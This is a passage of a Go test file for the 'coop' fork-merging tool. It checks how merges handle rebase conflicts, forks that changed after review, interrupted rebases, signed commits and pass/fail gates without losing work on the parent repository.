		t.Fatalf("retryable land intent = %+v, ok=%v err=%v", intent, ok, err)
	}
	item, _ := mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateInProgress {
		t.Fatalf("canonical task finalized before retry: %s", item.State)
	}
	c.gateOK = func(_, _, _ string) bool { return true }
	landed, err = mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if !landed || err != nil {
		t.Fatalf("retried merge = (%v, %v)", landed, err)
	}
	item, _ = mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateDone || !pathExists(filepath.Join(repo, "hotfix.txt")) || !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Fatalf("retried land lost work: task=%s", item.State)
	}
}

// A reviewed candidate whose rebase conflicts stopped before anything landed: the rebase is aborted
// and the fork is back on its reviewed commit. The land journal goes with it, as after a red gate, so
// the fork is not left "merging" and a later merge never resets the fork's branch to replay it.
func TestTaskCandidateMergeConflictLeavesNoLandJournal(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-conflict")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	if err := os.WriteFile(filepath.Join(repo, "feature.txt"), []byte("parent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "feature.txt")
	git(t, repo, "commit", "-qm", "parent edits feature")
	parent := forkspace.GitOut(repo, "rev-parse", "HEAD")

	landed, err := mergeOneForTest(t, c, repo, "", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "nothing merged") || !strings.Contains(err.Error(), "coop fork rm "+identity.Name+" --force") {
		t.Fatalf("conflicting merge = (%v, %v)", landed, err)
	}
	if strings.Contains(err.Error(), "git rebase") {
		t.Errorf("a reviewed candidate's conflict names a rebase by hand instead of the fork's loop: %v", err)
	}
	for _, want := range []string{"feature.txt", "reviewed again", "coop fork " + identity.Name + " --loop"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the conflict refusal does not say %q: %v", want, err)
		}
	}
	if onto, ok, err := tasks.ReadForkCandidateRebase(repo, identity); err != nil || !ok || onto.Onto != parent {
		t.Fatalf("rebase request after the conflict = %q, %v, %v; want the parent's %s", onto, ok, err, parent)
	}
	if pending, err := ForkHasPendingLand(repo, identity); err != nil || pending {
		t.Fatalf("land journal after a clean conflict: pending=%v err=%v", pending, err)
	}
	if got := forkspace.GitOut(ws, "rev-parse", "HEAD"); got != candidate.Head {
		t.Fatalf("fork HEAD after the conflict = %s, want the reviewed %s", got, candidate.Head)
	}
	if got := forkspace.GitOut(repo, "rev-parse", "HEAD"); got != parent {
		t.Fatalf("parent moved: %s, want %s", got, parent)
	}
	if _, ok, err := tasks.ReadForkCandidate(repo, identity); err != nil || !ok {
		t.Fatalf("reviewed candidate lost: ok=%v err=%v", ok, err)
	}
	if item, _ := mustCurrentTask(t, root, "canonical-task"); item.State != tasks.StateInProgress {
		t.Fatalf("canonical task after a conflict = %s", item.State)
	}

	// The person rewrites the fork's commit onto the parent. The merge refuses that unreviewed commit,
	// names the review it needs, and leaves it where it is.
	git(t, ws, "fetch", "-q", repo, "HEAD")
	git(t, ws, "reset", "-q", "--hard", "FETCH_HEAD")
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("resolved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "commit", "-qam", "implement canonical task\n\nCoop-Task: canonical-task")
	resolved := forkspace.GitOut(ws, "rev-parse", "HEAD")
	if landed, err := mergeOneForTest(t, c, repo, "", identity.Name, false); landed || err == nil ||
		!strings.Contains(err.Error(), "rebased but not reviewed again yet") || !strings.Contains(err.Error(), "coop fork "+identity.Name+" --loop") {
		t.Fatalf("merge of an unreviewed rewrite = (%v, %v)", landed, err)
	}
	if got := forkspace.GitOut(ws, "rev-parse", "HEAD"); got != resolved {
		t.Fatalf("merge reset the fork's branch to %s; the person's %s is gone", got, resolved)
	}
}

// After a conflicting merge, a fork is not "ready to merge", and at no step of its rebase does Coop
// tell anyone to reset it by hand: the listing says it conflicts and names its loop, a rebase stopped
// on the conflict or left detached at the parent is one the loop finishes, and a finished one waits
// for its review. A loop start leaves all of these to the loop.
func TestTaskCandidateConflictNamesTheLoopAtEveryStep(t *testing.T) {
	repo, ws, _, identity, c := prepareForkTaskCandidate(t, "task-conflict-steps")
	name := identity.Name
	status := func() forkStatus {
		t.Helper()
		return c.gatherForkStatus(repo, name, tasks.ReadProjectSnapshot(repo, nil))
	}
	loop := "coop fork " + name + " --loop"
	if err := os.WriteFile(filepath.Join(repo, "feature.txt"), []byte("parent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "feature.txt")
	git(t, repo, "commit", "-qm", "parent edits feature")
	if landed, err := mergeOneForTest(t, c, repo, "", name, false); landed || err == nil {
		t.Fatalf("conflicting merge = (%v, %v)", landed, err)
	}
	if s := status(); s.stateCell() != "conflict" || stateWords(s.stateCell(), "") != "conflicts with your branch" ||
		s.driftLine() != "Conflicts with main; rebase and review: "+loop || s.tasksLine() != "1 reviewed" {
		t.Fatalf("fork after a conflicting merge: state %q, %q, tasks %q", s.stateCell(), s.driftLine(), s.tasksLine())
	}

	unfinished := func(step string) {
		t.Helper()
		// Counted as merge counts the fork's branch, never the conflict markers in the work tree.
		if s := status(); s.stateCell() != "conflict" || s.driftLine() != "Rebase onto main not finished; rebase and review: "+loop ||
			s.Ins != 1 || s.Del != 0 {
			t.Errorf("%s: state %q, %q, +%d −%d", step, s.stateCell(), s.driftLine(), s.Ins, s.Del)
		}
		var landed bool
		var err error
		stderr := captureStderr(t, func() { landed, err = mergeOneForTest(t, c, repo, "", name, false) })
		var block *ui.UsageError
		if landed || !errors.As(err, &block) || block.Headline != "Fork "+name+"'s rebase onto main is not finished" ||
			!slices.Contains(block.Rows, [2]string{"Rebase and review:", loop}) || strings.Contains(err.Error(), "reset --hard") {
			t.Errorf("%s: merge = (%v, %v)", step, landed, err)
		}
		if strings.Contains(stderr, "Rebasing onto") {
			t.Errorf("%s: a merge that never rebases said it was rebasing:\n%s", step, stderr)
		}
		if err := RefuseDivergedFork(repo, identity); err != nil {
			t.Errorf("%s: a loop start refused the fork its loop rebases: %v", step, err)
		}
	}
	// The agent's rebase stopped on the conflict.
	git(t, ws, "fetch", "-q", repo, "HEAD")
	onto := forkspace.GitOut(ws, "rev-parse", "FETCH_HEAD")
	stop := exec.Command("git", "-C", ws, "rebase", onto)
	stop.Env = append(os.Environ(), "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t")
	if out, err := stop.CombinedOutput(); err == nil {
		t.Fatalf("the fork's rebase did not stop on the conflict:\n%s", out)
	}
	unfinished("stopped on the conflict")
	// Aborted, and left detached at the parent commit.
	git(t, ws, "rebase", "--abort")
	git(t, ws, "checkout", "-q", "--detach", onto)
	unfinished("detached at the parent")

	// Finished: the branch builds on the parent with the fork's commit on top.
	git(t, ws, "checkout", "-q", name)
	git(t, ws, "reset", "-q", "--hard", onto)
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("resolved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "commit", "-qam", "implement canonical task\n\nCoop-Task: canonical-task")
	// Its changes count from main, where merge counts them: the fork's line replaces main's.
	if s := status(); s.stateCell() != "changed" || s.driftLine() != "Changed: rebased onto main since its review; review it: "+loop ||
		s.Ins != 1 || s.Del != 1 {
		t.Fatalf("rebased fork: state %q, %q, +%d −%d", s.stateCell(), s.driftLine(), s.Ins, s.Del)
	}
}

// A signed merge whose rebase conflicts prints the conflict refusal alone: git's own hints name
// `git rebase --continue` for a rebase Coop already undid.
func TestSignedMergeConflictKeepsGitHintsOut(t *testing.T) {
	repo, _, _, identity, c := prepareForkTaskCandidate(t, "task-conflict-signed")
	signer := filepath.Join(t.TempDir(), "fake-gpg")
	script := "#!/bin/sh\ncat >/dev/null\nprintf '\\n[GNUPG:] SIG_CREATED D 1 8 00 0 0\\n' >&2\n" +
		"printf -- '-----BEGIN PGP SIGNATURE-----\\nfake\\n-----END PGP SIGNATURE-----\\n'\n"
	if err := os.WriteFile(signer, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "feature.txt"), []byte("parent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "feature.txt")
	git(t, repo, "commit", "-qm", "parent edits feature")
	git(t, repo, "config", "--global", "commit.gpgsign", "true")
	git(t, repo, "config", "--global", "gpg.program", signer)
	var landed bool
	var err error
	stderr := captureStderr(t, func() { landed, err = mergeOneForTest(t, c, repo, "", identity.Name, false) })
	if landed || err == nil || !strings.Contains(err.Error(), "feature.txt") || !strings.Contains(err.Error(), "coop fork "+identity.Name+" --loop") {
		t.Fatalf("signed conflicting merge = (%v, %v)", landed, err)
	}
	if strings.Contains(stderr, "hint:") || strings.Contains(stderr, "rebase --continue") {
		t.Errorf("git's conflict hints reached the terminal:\n%s", stderr)
	}
}

// A rebase git refuses with no conflict says signing only when the merge was signing; otherwise it
// gives git's own words.
func TestRebaseRefusalNamesSigningOnlyWhenSigning(t *testing.T) {
	cause := errors.New("git rebase: exit status 1: fatal: something else went wrong")
	plain := rebaseRefusedError("demo", &rebaseFailedError{name: "demo", branch: "main", cause: cause})
	if strings.Contains(strings.ToLower(plain.Error()), "sign") || !strings.Contains(plain.Error(), "something else went wrong") {
		t.Errorf("unsigned refusal = %v", plain)
	}
	signed := rebaseRefusedError("demo", &rebaseFailedError{name: "demo", branch: "main", signing: true, cause: cause})
	if !strings.Contains(signed.Error(), "signed") || !strings.Contains(signed.Error(), "coop fork merge demo") {
		t.Errorf("signing refusal = %v", signed)
	}
}

// A reviewed fork whose branch moved after its final review is not "ready to merge": the listing
// says it changed, and merge names the ways on that work. New commits on top go back to review; a
// branch that no longer builds on the reviewed commit (a person rebased it) goes back to that commit,
// or is discarded. Merge used to say only that the candidate was stale, and the listing said ready.
func TestTaskCandidateMergeNamesTheWayOutOfAChangedFork(t *testing.T) {
	repo, ws, _, identity, c := prepareForkTaskCandidate(t, "task-changed")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	name := identity.Name
	status := func() forkStatus {
		t.Helper()
		return c.gatherForkStatus(repo, name, tasks.ReadProjectSnapshot(repo, nil))
	}
	refusal := func() *ui.UsageError {
		t.Helper()
		landed, err := mergeOneForTest(t, c, repo, "", name, false)
		var block *ui.UsageError
		if landed || !errors.As(err, &block) {
			t.Fatalf("merge of a changed fork = (%v, %v), want a refusal block", landed, err)
		}
		return block
	}
	back := shellLine([]string{"git", "-C", ws, "reset", "--hard", candidate.Head})

	if s := status(); s.stateCell() != "ready" {
		t.Fatalf("reviewed fork state = %q, want ready", s.stateCell())
	}

	// New commits on top of the reviewed one.
	if err := os.WriteFile(filepath.Join(ws, "extra.txt"), []byte("more\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "extra.txt")
	git(t, ws, "commit", "-qm", "more work")
	if s := status(); s.stateCell() != "changed" || stateWords(s.stateCell(), "") != "changed after review" ||
		!strings.Contains(s.driftLine(), "coop fork "+name+" --loop") || s.tasksLine() != "1 reviewed" {
		t.Fatalf("fork ahead of its candidate: state %q, %q, tasks %q", s.stateCell(), s.driftLine(), s.tasksLine())
	}
	block := refusal()
	if block.Headline != "Fork "+name+" has new commits since its final review" ||
		!slices.Contains(block.Rows, [2]string{"Review them:", "coop fork " + name + " --loop"}) ||
		!slices.Contains(block.Rows, [2]string{"Or go back to the reviewed commit:", back}) {
		t.Fatalf("merge of a fork ahead of its candidate = %+v", block)
	}
	if err := RefuseDivergedFork(repo, identity); err != nil {
		t.Fatalf("a loop may review new commits on top of the candidate: %v", err)
	}

	// A person rewrites the reviewed commit, so the branch no longer builds on it.
	git(t, ws, "reset", "-q", "--hard", candidate.Head)
	git(t, ws, "commit", "-q", "--amend", "-m", "implement canonical task, by hand\n\nCoop-Task: canonical-task")
	rewritten := forkspace.GitOut(ws, "rev-parse", "HEAD")
	if s := status(); s.stateCell() != "changed" || !strings.Contains(s.driftLine(), "coop fork merge "+name+" says how to go on") {
		t.Fatalf("diverged fork: state %q, %q", s.stateCell(), s.driftLine())
	}
	wantRows := [][2]string{
		{"Go back to the reviewed commit:", back},
		{"Then merge it:", "coop fork merge " + name},
		{"Or discard its work:", "coop fork rm " + name + " --force"},
	}
	block = refusal()
	if block.Headline != "Fork "+name+" changed after its final review" || !slices.Equal(block.Rows, wantRows) ||
		!strings.Contains(block.Cause, "Nothing was merged.") || !strings.Contains(block.Cause, rewritten[:12]) {
		t.Fatalf("merge of a diverged fork = %+v", block)
	}
	if got := forkspace.GitOut(ws, "rev-parse", "HEAD"); got != rewritten {
		t.Fatalf("merge moved the fork's branch to %s", got)
	}
	var loopBlock *ui.UsageError
	if err := RefuseDivergedFork(repo, identity); !errors.As(err, &loopBlock) || !slices.Equal(loopBlock.Rows, wantRows) ||
		strings.Contains(loopBlock.Cause, "merged") {
		t.Fatalf("loop refusal on a diverged fork = %v", err)
	}

	// The way on it names works: back on the reviewed commit, the merge lands.
	git(t, ws, "reset", "-q", "--hard", candidate.Head)
	if s := status(); s.stateCell() != "ready" {
		t.Fatalf("fork back on its candidate: state %q", s.stateCell())
	}
	if landed, err := mergeOneForTest(t, c, repo, "", name, false); !landed || err != nil {
		t.Fatalf("merge after going back = (%v, %v)", landed, err)
	}
}

// A person's own rebase in the fork stopped half-way, with no rebase request open: the go-back
// advice aborts it first, since mid-rebase HEAD is detached and a reset would leave the branch where
// it was. Following the advice exactly puts the branch back on the reviewed commit, and it merges.
func TestChangedForkGoBackAdviceAbortsARebaseInProgress(t *testing.T) {
	repo, ws, _, identity, c := prepareForkTaskCandidate(t, "task-changed-mid-rebase")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	name := identity.Name
	git(t, ws, "commit", "-q", "--amend", "-m", "implement canonical task, by hand\n\nCoop-Task: canonical-task")
	// Replays the amended commit, then stops at the failing exec: git is mid-rebase, HEAD detached.
	if err := exec.Command("git", "-C", ws, "rebase", "-q", "-x", "false", "HEAD~1").Run(); err == nil {
		t.Fatal("the rebase should stop at its failing exec")
	}
	if !RebaseInProgress(ws) {
		t.Fatal("no rebase in progress in the fork")
	}
	want := shellLine([]string{"git", "-C", ws, "rebase", "--abort"}) + " && " +
		shellLine([]string{"git", "-C", ws, "reset", "--hard", candidate.Head})
	var block *ui.UsageError
	if err := RefuseDivergedFork(repo, identity); !errors.As(err, &block) ||
		!slices.Contains(block.Rows, [2]string{"Go back to the reviewed commit:", want}) {
		t.Fatalf("loop refusal mid-rebase = %v, want the row %q", err, want)
	}
	if out, err := exec.Command("sh", "-c", want).CombinedOutput(); err != nil {
		t.Fatalf("following the advice: %v\n%s", err, out)
	}
	if got := forkspace.GitOut(ws, "symbolic-ref", "--quiet", "--short", "HEAD"); got != name {
		t.Fatalf("after the advice HEAD is on %q, want the branch %s", got, name)
	}
	if s := c.gatherForkStatus(repo, name, tasks.ReadProjectSnapshot(repo, nil)); s.stateCell() != "ready" {
		t.Fatalf("fork after the advice: state %q", s.stateCell())
	}
	if landed, err := mergeOneForTest(t, c, repo, "", name, false); !landed || err != nil {
		t.Fatalf("merge after going back = (%v, %v)", landed, err)
	}
}

func TestTaskCandidateMergeReplaysCrashAfterRedGateRestoresWorkspace(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-red-gate-crash")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	c.gateOK = func(_, _, _ string) bool { return false }
	c.afterLandCandidateRestore = func() error { return errors.New("injected crash after candidate restore") }
	landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "injected crash") {
		t.Fatalf("crashed red-gate merge = (%v, %v)", landed, err)
	}
	if got := forkspace.GitOut(ws, "rev-parse", "HEAD"); got != candidate.Head {
		t.Fatalf("workspace HEAD after restore = %s, want %s", got, candidate.Head)
	}
	intent, pending, err := readLandIntent(repo, identity)
	if err != nil || !pending || intent.Phase != landRestoring {
		t.Fatalf("restoring journal = %+v, pending=%v err=%v", intent, pending, err)
	}
	c.afterLandCandidateRestore = nil
	landed, err = mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if landed || err == nil || !strings.Contains(err.Error(), "candidate restored") {
		t.Fatalf("restored red-gate replay = (%v, %v)", landed, err)
	}
	if _, pending, err := readLandIntent(repo, identity); err != nil || pending {
		t.Fatalf("restored red-gate journal remains: pending=%v err=%v", pending, err)
	}
	item, _ := mustCurrentTask(t, root, "canonical-task")
	if item.State != tasks.StateInProgress {
		t.Fatalf("red-gate replay finalized canonical task: %s", item.State)
	}
	c.gateOK = func(_, _, _ string) bool { return true }
	landed, err = mergeOneForTest(t, c, repo, "gate-img", identity.Name, false)
	if !landed || err != nil {
		t.Fatalf("green retry after restored red gate = (%v, %v)", landed, err)
	}
}

// TestMergeOneRebasesNamedBranch (M3): landing rebases the fork's OWN branch by name, even if the
// agent left a different branch checked out in the ws. With the parent moved forward, a non-rebased
// branch wouldn't fast-forward — so a clean land here proves `name` (not the stray branch) was rebased.
func TestMergeOneRebasesNamedBranch(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	// The fork's real work, committed on its branch "perf".
	if err := os.WriteFile(filepath.Join(ws, "wanted.txt"), []byte("real work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "perf work")
	// The parent moves forward, so a non-rebased branch could not fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "parent.txt"), []byte("moved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves on")
	// The agent wanders off onto a different branch in the ws.
	git(t, ws, "checkout", "-q", "-b", "stray")
	if err := os.WriteFile(filepath.Join(ws, "stray.txt"), []byte("not this\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "stray work")

	landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil) — it must rebase the named branch", landed, err)
	}
	if !pathExists(filepath.Join(repo, "wanted.txt")) {
		t.Error("did not land the fork's named-branch work")
	}
	if pathExists(filepath.Join(repo, "stray.txt")) {
		t.Error("wrongly landed the stray checked-out branch")
	}
}

func TestMergeOneConflictRollsBack(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}

	ws, err := forkspace.Setup(repo, "a")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	// Fork and parent edit the same line → a merge conflict.
	if err := os.WriteFile(filepath.Join(ws, "README.md"), []byte("fork-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "commit", "-aqm", "fork edit")
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("parent-version\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "commit", "-aqm", "parent edit")

	landed, err := mergeOneForTest(t, c, repo, "", "a", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want (false, error)", landed, err)
	}
	// The conflicted merge must be fully aborted: tree clean, parent content intact.
	if gitDirty(repo) {
		t.Error("working tree left dirty after a conflicted merge")
	}
	if data, _ := os.ReadFile(filepath.Join(repo, "README.md")); string(data) != "parent-version\n" {
		t.Errorf("README.md = %q, want %q", data, "parent-version\n")
	}
}

// A coop killed mid-land (host crash, SIGKILL) leaves git's rebase state in the fork's clone. The next
// merge recovers it — but only when nobody could still own that worktree, because `rebase --abort`
// resets it.
func TestMergeRecoversInterruptedRebase(t *testing.T) {
	t.Run("abandoned worktree recovers and the fork lands", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		c := &Control{cfg: &config.Config{}}
		landed, err := mergeOneForTest(t, c, repo, "", "perf", false)
		if !landed || err != nil {
			t.Fatalf("mergeOne over leftover rebase state = (%v, %v), want the merge to recover and land", landed, err)
		}
		if data, _ := os.ReadFile(filepath.Join(repo, "feature.txt")); string(data) != "work\n" {
			t.Errorf("landed feature.txt = %q, want the fork's own work", data)
		}
		if left := leftoverRebaseState(ws); left != "" {
			t.Errorf("rebase state %q survived the merge", left)
		}
		if branch := gitBranch(ws); branch != "perf" {
			t.Errorf("fork left on branch %q, want perf restored by the abort", branch)
		}
	})

	t.Run("provably dead owner recovers", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		// A worker state whose pid the kernel answers ESRCH for: nothing can be running.
		if err := os.MkdirAll(forkspace.StateDir(repo), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := forkspace.WriteWorkerState(repo, "perf", deadWorkerOf(bindTestFork(t, repo, "perf"))); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		if err := c.rebaseForkOntoParent(repo, ws, "perf"); err != nil {
			t.Fatalf("rebase over a dead owner's leftover state = %v, want recovery", err)
		}
		if left := leftoverRebaseState(ws); left != "" {
			t.Errorf("rebase state %q survived the recovery", left)
		}
		// The recovery let the real rebase run: the fork's commit now sits on the parent's HEAD.
		if base, head := forkspace.GitOut(ws, "rev-parse", "perf~1"), forkspace.GitOut(repo, "rev-parse", "HEAD"); base != head {
			t.Errorf("perf~1 = %q, want the parent HEAD %q", base, head)
		}
	})

	t.Run("live owner refuses", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		// mergeOne refuses any fork with lifecycle state well before this, so drive the rebase
		// directly: the recovery must guard its own destructive abort, not lean on that check.
		if err := forkspace.WritePid(repo, "perf", os.Getpid(), testWorkerGeneration); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		err := c.rebaseForkOntoParent(repo, ws, "perf")
		if err == nil || !strings.Contains(err.Error(), strconv.Itoa(os.Getpid())) || !strings.Contains(err.Error(), "coop fork stop perf") {
			t.Fatalf("rebase over a live owner's leftover state = %v, want a refusal naming pid %d", err, os.Getpid())
		}
		if leftoverRebaseState(ws) == "" {
			t.Error("a refused recovery still aborted the live owner's rebase")
		}
	})

	t.Run("unverifiable owner refuses", func(t *testing.T) {
		repo, ws := forkWithInterruptedRebase(t)
		if err := forkspace.WritePid(repo, "perf", os.Getpid(), testWorkerGeneration); err != nil {
			t.Fatal(err)
		}
		oldRead := forkspace.ReadProcStartToken
		forkspace.ReadProcStartToken = func(int) string { return "" } // liveness undecidable, so nothing is provable
		t.Cleanup(func() { forkspace.ReadProcStartToken = oldRead })
		c := &Control{cfg: &config.Config{}}
		err := c.rebaseForkOntoParent(repo, ws, "perf")
		if err == nil || !strings.Contains(err.Error(), "coop fork stop perf") {
			t.Fatalf("rebase over an unverifiable owner = %v, want a fail-closed refusal", err)
		}
		if leftoverRebaseState(ws) == "" {
			t.Error("a refused recovery still aborted an unverifiable owner's rebase")
		}
	})

	t.Run("an abort that fails surfaces the manual recovery", func(t *testing.T) {
		if _, err := exec.LookPath("git"); err != nil {
			t.Skip("git not available")
		}
		repo := initRepo(t)
		ws, err := forkspace.Setup(repo, "perf")
		if err != nil {
			t.Fatalf("forkspace.Setup: %v", err)
		}
		// State git itself cannot abort: an am-backend directory with no rebase behind it.
		if err := os.Mkdir(filepath.Join(ws, ".git", "rebase-apply"), 0o755); err != nil {
			t.Fatal(err)
		}
		c := &Control{cfg: &config.Config{}}
		if err := c.rebaseForkOntoParent(repo, ws, "perf"); err == nil ||
			!strings.Contains(err.Error(), "could not abort") || !strings.Contains(err.Error(), ws) {
			t.Fatalf("failed abort = %v, want a loud error carrying git's reason and the manual recovery", err)
		}
	})
}

// forkWithInterruptedRebase builds a parent and a fork whose clone was left mid-rebase, exactly as a
// coop killed during a land leaves it: git's state directory present, the fork's commit unlanded.
func forkWithInterruptedRebase(t *testing.T) (string, string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	// The parent moves on, so a land can only succeed if the fork was really rebased onto it.
	if err := os.WriteFile(filepath.Join(repo, "parent.txt"), []byte("moved\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves on")
	// Strand a real rebase: replaying the fork's commit onto a sibling that touched the same file
	// conflicts, so git stops and leaves its state directory behind — no synthetic dir.
	git(t, ws, "checkout", "-q", "-b", "sibling", "perf~1")
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("sibling\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "sibling work")
	// Strand it the way a killed coop would: through the trusted git view, where coop's own
	// rebases keep their state (a later coop process finds it there and aborts it).
	rebase, err := forkspace.GitCommand(context.Background(), ws, "rebase", "sibling", "perf")
	if err != nil {
		t.Fatal(err)
	}
	if out, err := rebase.CombinedOutput(); err == nil {
		t.Fatalf("fixture: the rebase was meant to conflict:\n%s", out)
	}
	if leftoverRebaseState(ws) == "" {
		t.Fatal("fixture: git left no rebase state behind")
	}
	return repo, ws
}

// TestMergeOneAbortsWhenParentMovesDuringGate is the core of the CAS fix: if a commit lands on the
// parent WHILE the gate runs, the fast-forward-only merge must refuse — landing nothing and leaving
// the concurrent commit intact — instead of a reset --hard erasing it. The gate seam injects the
// concurrent commit to open that window deterministically.
func TestMergeOneAbortsWhenParentMovesDuringGate(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	// The gate "passes", but a concurrent commit lands on the parent while it runs.
	c.gateOK = func(_, _, _ string) bool {
		if err := os.WriteFile(filepath.Join(repo, "hotfix.txt"), []byte("urgent\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, repo, "add", "-A")
		git(t, repo, "commit", "-qm", "concurrent hotfix")
		return true
	}
	landed, err := mergeOneForTest(t, c, repo, "gate-img", "perf", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want abort — the parent moved during the gate", landed, err)
	}
	// The concurrent commit survives (not erased), and the fork did NOT land.
	if !pathExists(filepath.Join(repo, "hotfix.txt")) {
		t.Error("the concurrent commit was erased — reset --hard regression")
	}
	if pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("the fork landed onto a moved parent — the CAS did not refuse")
	}
}

// TestMergeOneGateFailLeavesParentUntouched: a red gate never mutates the parent — nothing to roll
// back — because the gate runs on the candidate (the fork clone), not the live parent.
func TestMergeOneGateFailLeavesParentUntouched(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	pre := forkspace.GitOut(repo, "rev-parse", "HEAD")
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	c.gateOK = func(_, _, _ string) bool { return false } // red gate
	landed, err := mergeOneForTest(t, c, repo, "gate-img", "perf", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want a gate failure", landed, err)
	}
	if pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("the fork landed despite a red gate")
	}
	if head := forkspace.GitOut(repo, "rev-parse", "HEAD"); head != pre {
		t.Errorf("parent HEAD moved on a red gate: %s → %s", pre, head)
	}
	if gitDirty(repo) {
		t.Error("parent tree left dirty after a red gate")
	}
}

// TestMergeOneGatePassLands: a green gate advances the parent (the seam lets this run without a box).
func TestMergeOneGatePassLands(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	c.gateOK = func(_, _, _ string) bool { return true } // green gate
